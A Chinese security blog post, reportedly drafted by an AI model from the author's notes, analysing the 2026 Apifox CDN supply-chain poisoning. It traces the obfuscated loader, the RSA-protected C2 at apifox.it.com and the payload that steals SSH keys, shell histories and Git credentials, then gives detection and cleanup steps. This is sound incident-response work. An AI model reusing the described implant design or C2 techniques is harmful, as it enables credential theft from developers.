---
title: Apifox CDN 供应链投毒事件简单复盘
url: https://www.leavesongs.com/PENETRATION/apifox-supply-chain-attack-analysis.html
source: 离别歌
date: 2026-03-25
fetch_date: 2026-03-26T04:25:00.087463
---

# Apifox CDN 供应链投毒事件简单复盘

* [主页](/)
* 返回

Back to top
Share post

# Apifox CDN 供应链投毒事件简单复盘

phithon

Mar 26, 2026, 12:51 AM

阅读：2742

[网络安全](/sort/PENETRATION)

[投毒](/tag/%E6%8A%95%E6%AF%92),
[apifox](/tag/apifox)

> 这是AI大模型根据我白天的分析过程简单编写的一篇文章，如果有错误或遗漏，还请见谅。我以后的文章并不会都用AI来写，不用担心。

2026 年 3 月 25 号，正当大家都还忙着应急LiteLLM投毒事件的同时，安全圈里开始流传一则不太寻常的消息：Apifox 桌面客户端疑似在官方 CDN 上的埋点脚本里被人动了手脚。

最初的披露来自 [2libra 上的梳理](https://2libra.com/post/network-security/8HvXoR_)，已经点出了几个关键事实：被篡改的是 `https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js`，正常体积大约 34KB，投毒后胀到约 77KB；恶意逻辑会再去拉 `apifox.it.com` 上的脚本并执行。

由于我的电脑上也安装了 Apifox（虽然在 3 月份没有打开过），所以关注较多，想弄清攻击者的具体行为。复现时首先遇到的问题是：**公开讨论出现时，CDN 上的恶意文件往往已被替换，C2 也可能不可达。** 下文基于已有线索与归档，对攻击链与样本做梳理说明。

## [从 Wayback 获取阶段一样本](#wayback)

当前 CDN 上已为干净版本，因此从 **Internet Archive** 检索投毒期间的归档。@0cat 找到的快照时间为 UTC 2026-03-05 05:14:18：

`https://web.archive.org/web/20260305051418/https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js`

文件结构为：前段为 Apifox 原有事件追踪代码，后段自 `_0x10e4()` 等符号起增加约 40KB，即合法埋点之后追加恶意载荷。

投毒段采用字符串数组与洗牌、RC4、代理函数、十六进制常量及反调试等常见混淆；若对代码做过度格式化，运行时可能触发反分析逻辑。手工逐行还原成本高，本文使用 Claude Code 进行分析，梳理了 C2、轮询间隔以及对 `require('crypto')` 等调用的关系。可读版本见 <https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5>，下文仅给出结论，不重复贴源码。

[![1.png](/media/attachment/2026/03/26/5c151ed7-1145-49ff-97e4-dca3697ea1d8.21f14562b407.png)](/media/attachment/2026/03/26/5c151ed7-1145-49ff-97e4-dca3697ea1d8.png)

还原后的阶段一逻辑可以概括成「凑齐身份 → 带自定义头请求 C2 → 解密并 `eval`」，且只在 **Electron 桌面端**里跑得通：普通浏览器里没有同等的 `require('crypto')`、`require('os')` 路径。

脚本通过 `require('crypto')`、`require('os')` 读取网卡 MAC（排除回环与全零）、CPU 型号、主机名、系统用户名与 OS 类型，拼成字符串后做 **SHA-256**，结果写入 `localStorage` 的 `_rl_mc`，并作为请求头里的 `af_uuid`。操作系统版本以明文放在 `af_os`；用户名与主机名用内嵌 **RSA 私钥**经 `privateEncrypt`（PKCS#1 v1.5）打成 Base64，对应 `af_user`、`af_name`。这些字段会缓存在 `_rl_headers`，避免每次重复采集。

若 `localStorage` 里存在 Apifox 的 `common.accessToken`，代码会用该 Token 调用官方接口 `https://api.apifox.com/api/v1/user`，取出账号邮箱与显示名，再经 RSA 加密写入 `af_apifox_user`、`af_apifox_name`，并合并回 `_rl_headers`。阶段一因此同时上报机器指纹与「当前登录的 Apifox 账号」信息。

内嵌的同一套 **RSA 2048 私钥**也用于处理 C2 回包：响应体按 256 字节分块，用 `privateDecrypt`、OAEP（SHA-256）解成明文 JavaScript。`loadAndExecute` 用 `fetch` 请求 `https://apifox.it.com/public/apifox-event.js`，将拼好的对象作为 HTTP 头带上；若响应成功，对 **trim 后的正文**解密后 **`eval` 执行**。

`try`/`catch` 中出错会静默忽略；`finally` 里固定调用 `scheduleNext()`，在约 30 分钟～3 小时的随机间隔后再次 `setTimeout(loadAndExecute, …)`，因此网络失败或 `eval` 抛错也不会停轮询。脚本末尾以 `void loadAndExecute()` 入口，加载后即跑第一轮。

阶段一不读取 `~/.ssh` 或 shell 历史，此类行为在后续 C2 下发的载荷中才出现，下文再写。

## [通过证书信息定位 C2](#c2)

阶段一中下载并动态加载了`https://apifox.it.com/public/apifox-event.js`这个链接中的恶意代码，我们继续分析。

域名 `apifox.it.com` 与官方域名相近，公开分析阶段已无法正常解析。参考 @wfox 的做法，在 Quake 中使用 `cert:"apifox.it.com"` 检索证书字段，将服务定位到 **13.192.121.27**（东京 AWS EC2），对外为 nginx/1.28.2，后端为 Express。直接以 IP 访问返回 HTTP 404，表明对 Host 或路由存在过滤，而非对任意访问开放同一内容。

[![2.png](/media/attachment/2026/03/26/77978efb-ad00-4ba3-8aa3-c7514afa7cf2.27440f0fbd25.png)](/media/attachment/2026/03/26/77978efb-ad00-4ba3-8aa3-c7514afa7cf2.png)

## [依赖自定义 HTTP 头的阶段二响应](#http)

将 `apifox.it.com` 解析到上述 IP 后，若仅发送默认 `GET /public/apifox-event.js`，常见结果为 HTTP 200 与空响应体。对照反混淆代码可知，服务器需要客户端携带一组自定义请求头，例如 `af_uuid`（机器指纹哈希）、`af_os`、`af_user`、`af_name` 等，其中部分字段经 RSA 处理。缺少或不符合要求时不下发有效载荷，默认 `curl` 难以直接获取内容。

请求头齐全后，响应体为 **344 字节 RSA 密文**；使用阶段一样本中提取的私钥，按 `rsaDecrypt`（OAEP、SHA-256）解密得到 IIFE：向 `document.head` 插入 `<script src="https://apifox.it.com/02ab429d.js">`，在 `onload` 中从 DOM 移除该节点。

[![3.png](/media/attachment/2026/03/26/8edfe8ad-dac9-4874-8602-af2c35a7900f.29c522806442.png)](/media/attachment/2026/03/26/8edfe8ad-dac9-4874-8602-af2c35a7900f.png)

阶段一已通过 `eval` 执行远程代码；阶段二改为由 `<script>` 加载第三阶段，加载后移除节点，可降低在 DOM 中残留脚本标签的概率。

## [第三阶段：明文窃密载荷](#_1)

`02ab429d.js` 约 3.6KB，未再叠加混淆层，可直接阅读。

[![4.png](/media/attachment/2026/03/26/382c7d2e-8f74-4c1b-9532-57b21240ce7a.39fc1df2641a.png)](/media/attachment/2026/03/26/382c7d2e-8f74-4c1b-9532-57b21240ce7a.png)

这个脚本在 macOS / Linux 上读取 `~/.ssh/`（递归）、`.zsh_history`、`.bash_history`、`.git-credentials`，并执行 `ps aux`；在 Windows 上读取 `%USERPROFILE%\.ssh\` 并执行 `tasklist`。数据经 `JSON.stringify`、gzip 压缩后，使用 `scrypt("apifox", "foxapi", 32)` 派生密钥，以 AES-256-GCM 加密，通过 HTTPS POST 提交至 `https://apifox.it.com/event/0/log`，`Content-Type` 为 `text/plain`，可能用于与常见文本请求在流量特征上接近。

阶段一载荷附着在合法埋点之后，依赖 Electron 环境内的 `require('crypto')`、`require('os')` 等接口；在普通浏览器中通常不具备相同能力。阶段一从 `localStorage` 读取 `common.accessToken`，调用 `https://api.apifox.com/api/v1/user` 获取邮箱与用户名等信息，并在请求 C2 时写入 `af_*` 等头部。`loadAndExecute` 使用 `try/catch/finally`，在 `finally` 中调用 `scheduleNext()`，以约 30 分钟至 3 小时的随机间隔再次执行；即使本次请求或 `eval` 失败，仍会调度下一轮。

阶段二仅负责加载第三阶段脚本并移除 script 节点，不包含上述窃密逻辑。阶段一内嵌 RSA 私钥：外发数据使用 `privateEncrypt`（PKCS1），接收 C2 响应使用 `privateDecrypt`（OAEP、SHA-256）。C2 持有对应公钥即可解密客户端上报内容；下行载荷需使用公钥加密，故仅从样本中提取私钥无法伪造服务器下发的密文，但足以解密阶段二响应。该设计侧重实现成本与对下行内容的控制，而非防止已获样本的分析方还原阶段二。

## [自查与修复](#_2)

### [是否可能中招](#_3)

满足以下**任一**条件时，基本确认中招：

1. **时间与版本**：在 **2026 年 3 月 4 日**至官方修复前，曾使用 Apifox **桌面版**且版本 **低于 2.8.19**（含在此期间启动过客户端，即使使用频率不高）。
2. **网络侧**：防火墙、代理或 DNS 日志中出现对 **`apifox.it.com`** 或报告中的关联域名的出站访问；或存在对 `GET /public/apifox-event.js`、`GET /02ab429d.js`、`POST /event/0/log` 等路径的请求记录。
3. **客户端存储（开发者工具）**：在 Apifox 桌面版打开开发者工具（Windows / Linux：`Ctrl+Shift+I`，macOS：`Cmd+Option+I`），在 **Application → Local Storage** 或 **Console** 中检查是否存在键 **`_rl_mc`**、**`_rl_headers`**；若 `_rl_headers` 内容中出现 **`af_uuid`**、**`af_user`** 等与样本一致的字段，与恶意行为高度相关。
4. **本机数据目录（离线排查）**：不依赖客户端是否还能打开开发者工具时，可直接查 Electron/Chromium 写在磁盘上的状态。在 Apifox 用户数据目录中找到名为 **`Network Persistent State`** 的文件（无扩展名），用文本编辑器或 `strings` 搜索其中是否出现 **`apifox.it.com`**，若出现则说明本机曾对该域名产生过网络层相关记录。常见路径包括：Windows 为 `%APPDATA%\apifox\Network\Network Persistent State`；通过 Scoop 安装的，多为 `<scoop 根目录>\apps\apifox\current\UserData\Network\Network Persistent State`（以本机 `current` 实际指向为准）。此外可在 **Local Storage 对应的 LevelDB** 中检索键名 **`rl_mc`**、**`rl_headers`**（与运行时 Local Storage 中的 `_rl_mc`、`_rl_headers` 相对应）；macOS 上该目录通常在 `~/Library/Application Support/Apifox/Local Storage/leveldb`。LevelDB 为二进制存储，需用 `strings`、十六进制编辑或 LevelDB 查看工具检索，**不建议**在未备份的情况下手工改库。

以上第 2、3、4 项（网络与存储侧）为强指示；仅版本与时间重合但无日志、无上述痕迹时，仍建议完成版本升级与凭据轮换中的「低风险项」（如升级客户端、修改 Apifox 密码并重新登录）。

### [处置（建议按优先级执行）](#_4)

**1. 升级客户端**

**2. SSH 密钥**
恶意样本会读取 `~/.ssh/`（Windows 为用户目录下 `.ssh`）。在已完成备份的前提下，视情况在服务器上移除旧公钥、本机重新生成密钥对并轮换部署；同时审计 `auth.log` 等登录记录中的异常公钥认证。

**3. Git 与代码托管**
若存在 **`~/.git-credentials`**，应按已泄露处理：删除该文件，在 GitHub / GitLab 等平台**吊销并重建** Personal Access Token，修改账号密码，并改用系统凭据助手（如 macOS `osxkeychain`、Windows `manager` 等）。对 2026-03-04 以来的仓库操作做审计。

**4. Shell 历史**
`.zsh_history`、`.bash_history` 等曾被读取，其中若出现过数据库口令、API Key、云厂商 AccessKey、`export` 形式的密钥等，需**逐项轮换**相关凭据，不能仅改密码而忽略历史里出现过的其他 Secret。

**5. Apifox 账号**
修改 Apifox 账号密码，在客户端**退出登录后重新登录**以刷新 `accessToken`；检查团队与项目内是否有异常操作。

**6. 网络阻断与重装（企业或本机）**
在防火墙或 DNS 上对 **`apifox.it.com`**、**`cdn.openroute.dev`**、**`upgrade.feishu.it.com`** 等已知恶意域名及《应急响应报告》中的 IP 做黑名单。建议在完成阻断后，**卸载并从官网下载安装最新正式版** Apifox，以减少本地持久化状态带来的干扰；再按上文完成凭据轮换与升级版本要求（≥2.8.19）。

## [小结](#_5)

样本恢复依赖归档与测绘；阶段二、三依赖对阶段一逻辑的重现与正确构造请求头。各阶段技术选型单独看均较常见，组合后形成完整窃密链：初始植入位于合法埋点之后，后续依次使用混淆与 RSA 处理 C2 通信，通过脚本标签拉取下一阶段，最后以 AES 加密外传数据，对象主要包括 SSH 目录与 Git 凭据等。产品与运维可对运行时远程脚本的 URL 与更新机制做检查，评估资源被替换后的影响范围；终端用户是否受影响及处置步骤见上文「自查与修复」。

## [参考与延伸](#_6)

* [2libra 相关文章](https://2libra.com/post/network-security/8HvXoR_)
* <https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5>
* [关于 Apifox 公网 SaaS 版外部 JS 文件受篡改的风险提示与升级公告](https://mp.weixin.qq.com/s/GpACQdnhVNsMn51cm4hZig)

# 赞赏

喜欢这篇文章？打赏1元

![](/static/wx.jpg)

# 评论

![](/static/placeholder.jpg)

😃

Mar 26, 2026, 11:50 AM
回复

flatpak版的客户端也受到影响吗？会影响到沙箱外的数据吗？

![](/static/placeholder.jpg)

Jack

Mar 26, 2026, 10:58 AM
回复

是否有后门哈？ 这块大佬有进行进一步建议吗？ 受影响电脑是否重置系统？

![](https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g)

[phithon](https://www.leavesongs.com)

Mar 26, 2026, 11:01 AM
回复

@Jack 暂时没看到有常驻后门，但我通常建议要重装电脑，因为第二阶段的恶意脚本是动态加载的，我们所有人分析的都只是昨天我们读到的恶意代码，但不代表之前恶意代码也是这一段，也许攻击者干了更多事情，只是我们不知道。

![captcha](/captcha/image/4e870fbca011f60ed2f0cd57d4db9cbff2dd17c7/)

Copyright © 20...